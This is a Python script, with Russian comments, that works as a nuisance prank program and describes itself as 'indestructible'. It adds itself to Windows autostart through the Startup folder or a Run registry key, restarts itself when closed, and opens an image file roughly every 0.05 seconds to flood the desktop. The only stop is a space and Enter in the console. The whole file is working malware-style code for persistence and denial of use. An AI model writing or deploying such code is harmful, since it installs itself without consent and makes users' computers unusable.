# -*- coding: utf-8 -*-
"""
Неуничтожимая версия с автозапуском:
- 1.mp3 открывается и ждёт закрытия
- 2.jpg спамит сразу (0 секунд ожидания)
- Автозапуск: сначала папка Startup, если не выйдет — реестр Windows
- Программа самоперезапускается при попытке закрыть
- Остановка: пробел + Enter
"""
from pathlib import Path
import sys, subprocess, platform, threading, time, os, shutil

BASE_DIR = Path(__file__).resolve().parent
TARGET_DIR = BASE_DIR / "ПЕТУШОКПРАЗДНИК"
FILE1 = TARGET_DIR / "1.mp3"
FILE2 = TARGET_DIR / "2.jpg"

STOP = threading.Event()

# ==== Функция автозапуска ====
def add_to_startup():
    if platform.system() != "Windows":
        return
    exe_path = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
    # 1. Папка Startup
    try:
        startup = Path(os.getenv("APPDATA")) / r"Microsoft\Windows\Start Menu\Programs\Startup"
        dest_path = startup / Path(exe_path).name
        if not dest_path.exists():
            shutil.copy(exe_path, dest_path)
            print(f"[+] Программа добавлена в автозагрузку через Startup: {dest_path}")
            return
    except Exception as e:
        print("[-] Ошибка добавления в Startup:", e)
    # 2. Если не получилось — реестр
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "PetushokPrazdnikApp", 0, winreg.REG_SZ, exe_path)
        key.Close()
        print("[+] Программа добавлена в автозагрузку через реестр.")
    except Exception as e:
        print("[-] Ошибка добавления в реестр:", e)

# ==== Функции открытия файлов ====
def open_and_wait(path: Path):
    plat = platform.system()
    p = None
    try:
        if plat == "Windows":
            subprocess.run(["cmd", "/c", "start", "", "/WAIT", str(path)], check=False)
            return
        elif plat == "Darwin":
            subprocess.run(["open", "-W", str(path)], check=False)
            return
        else:
            try:
                p = subprocess.Popen(["xdg-open", str(path)])
            except Exception:
                try:
                    p = subprocess.Popen(["gio", "open", str(path)])
                except Exception:
                    p = None
            has_lsof = shutil.which("lsof") is not None
            if has_lsof:
                while True:
                    if STOP.is_set():
                        return
                    proc = subprocess.run(["lsof", str(path)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    if proc.returncode != 0:
                        return
                    time.sleep(0.5)
            else:
                time.sleep(1.0)
                return
    finally:
        if p is not None:
            try:
                p.wait(timeout=0.1)
            except Exception:
                pass

def ensure_file_exists(path: Path):
    if not path.exists():
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("", encoding="utf-8")

# ==== Поток для 1.mp3 ====
def file1_watcher():
    ensure_file_exists(FILE1)
    while not STOP.is_set():
        try:
            open_and_wait(FILE1)
        except Exception as e:
            print("Ошибка при открытии 1.mp3:", e)
        for _ in range(20):
            if STOP.is_set():
                break
            time.sleep(0.1)

# ==== Поток для 2.jpg (спам сразу) ====
def file2_spammer():
    ensure_file_exists(FILE2)
    while not STOP.is_set():
        try:
            plat = platform.system()
            if plat == "Windows":
                subprocess.Popen(["cmd", "/c", "start", "", str(FILE2)])
            elif plat == "Darwin":
                subprocess.Popen(["open", str(FILE2)])
            else:
                try:
                    subprocess.Popen(["xdg-open", str(FILE2)])
                except Exception:
                    try:
                        subprocess.Popen(["gio", "open", str(FILE2)])
                    except Exception:
                        if hasattr(os, "startfile"):
                            os.startfile(str(FILE2))
        except Exception as e:
            print("Ошибка при открытии 2.jpg:", e)
        # Задержка 0.05 с между открытиями
        for _ in range(5):
            if STOP.is_set():
                break
            time.sleep(0.01)

# ==== Поток слушателя для остановки ====
def space_listener():
    print("Для остановки нажмите пробел и Enter.")
    while not STOP.is_set():
        s = sys.stdin.readline()
        if not s:
            break
        if s.strip() == "":
            STOP.set()
            break

# ==== Функция перезапуска программы ====
def self_restart():
    exe_path = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
    print("[!] Попытка перезапуска программы...")
    subprocess.Popen([exe_path], close_fds=True)
    sys.exit()

# ==== Главная функция ====
def main():
    add_to_startup()  # добавляем в автозапуск
    ensure_file_exists(FILE1)
    ensure_file_exists(FILE2)

    while True:
        STOP.clear()
        t1 = threading.Thread(target=file1_watcher, daemon=True)
        t2 = threading.Thread(target=file2_spammer, daemon=True)
        tin = threading.Thread(target=space_listener, daemon=True)

        t1.start()
        t2.start()
        tin.start()

        try:
            while not STOP.is_set():
                time.sleep(0.2)
        except Exception:
            self_restart()

        if STOP.is_set():
            print("[*] Программа остановлена пользователем.")
            break

        self_restart()

if __name__ == "__main__":
    main()
